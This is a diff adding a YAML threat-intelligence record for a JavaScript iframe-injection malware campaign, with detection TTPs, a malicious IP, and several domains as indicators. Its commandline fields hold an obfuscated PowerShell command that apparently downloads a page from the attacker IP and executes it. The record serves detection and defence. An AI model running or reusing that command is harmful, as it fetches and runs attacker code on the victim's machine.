@@ -1,0 +1,47 @@
+description: 'JavaScript-based malware campaign affecting compromised websites by
+  injecting a fullscreen iframe that silently loads content from suspicious external
+  domains.'
+TTPs:
+  processes:
+  - cmd.exe
+  commandline:
+  - cmd.exe /c "start /min powershell -nop -ep Bypass -eC aQB3AHIAIAAiAGgAdAB0AHAAOgAvAC8AMQA4ADAALgAxADcAOAAuADEAOAA5AC4ANwAvAG0AeQBjAGEAcAB0AGMAaABhAC4AaAB0AG0AbAAiACAAfAAgAGkAZQB4AA=="
+  powershell:
+  - cmd.exe /c "start /min powershell -nop -ep Bypass -eC aQB3AHIAIAAiAGgAdAB0AHAAOgAvAC8AMQA4ADAALgAxADcAOAAuADEAOAA5AC4ANwAvAG0AeQBjAGEAcAB0AGMAaABhAC4AaAB0AG0AbAAiACAAfAAgAGkAZQB4AA=="
+  - powershell -nop -ep Bypass -eC aQB3AHIAIAAiAGgAdAB0AHAAOgAvAC8AMQA4ADAALgAxADcAOAAuADEAOAA5AC4ANwAvAG0AeQBjAGEAcAB0AGMAaABhAC4AaAB0AG0AbAAiACAAfAAgAGkAZQB4AA==
+  - powershell -nop -ep Bypass -eC aQB3AHIAIAAiAGgAdAB0AHAAOgAvAC8AMQA4ADAALgAxADcAOAAuADEAOAA5AC4ANwAvAG0AeQBjAGEAcAB0AGMAaABhAC4AaAB0AG0AbAAiACAAfAAgAGkAZQB4AA==
+  scripting_engine:
+  - javascript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: powershell
+    destination_address: http://180.178.189.7/mycaptcha.html
+    port: 80
+  file_activity:
+  - C:\Windows\System32\cmd.exe
+  - C:\Windows\System32\powershell.exe
+  persistence: []
+  pipes: []
+  process_relations:
+  - cmd.exe -> powershell.exe
+IOCs:
+  hashes: []
+  IPs:
+  - 180.178.189.7
+  domains:
+  - capcloud[.]icu
+  - wallpaper-engine[.]pro
+  - wanderclean[.]com
+  - ampunshifu[.]org
+  - cdnstat[.]net
+  - adoodlz[.]com
+  - secretdinosaurcult[.]com
+  - weathersnoop[.]com
+  URLs:
+  - http://180.178.189.7/mycaptcha.html
+authors:
+- Puja Srivastava
+reference: https://blog.sucuri.net/2025/08/malicious-javascript-injects-fullscreen-iframe-on-a-wordpress-website.html
+date_of_publication: August 14, 2025
+file_creation_date: August 17, 2025
